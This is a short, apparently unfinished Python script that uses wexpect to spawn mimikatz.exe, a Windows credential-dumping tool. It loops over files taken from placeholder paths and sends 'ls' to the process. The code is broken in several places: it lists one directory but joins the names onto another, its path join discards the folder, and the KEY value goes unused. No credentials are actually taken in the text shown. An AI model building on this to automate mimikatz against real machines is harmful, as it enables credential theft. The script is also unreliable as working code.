import wexpect
import time
import os

PATH_TO_EXE = r'insertpathtoexehere'
PATH_TO_FOLDER = r'insertpathtofolderhere' 
KEY = "insertkeyhere"

fileNames = []
time.sleep(5)

for file in os.listdir(PATH_TO_EXE):
    fileNames.append(file)

child = wexpect.spawn("mimikatz.exe")

for file in fileNames:
    pathToFile = os.path.join(PATH_TO_FOLDER, '\\'+file)
    
    child.sendline('ls')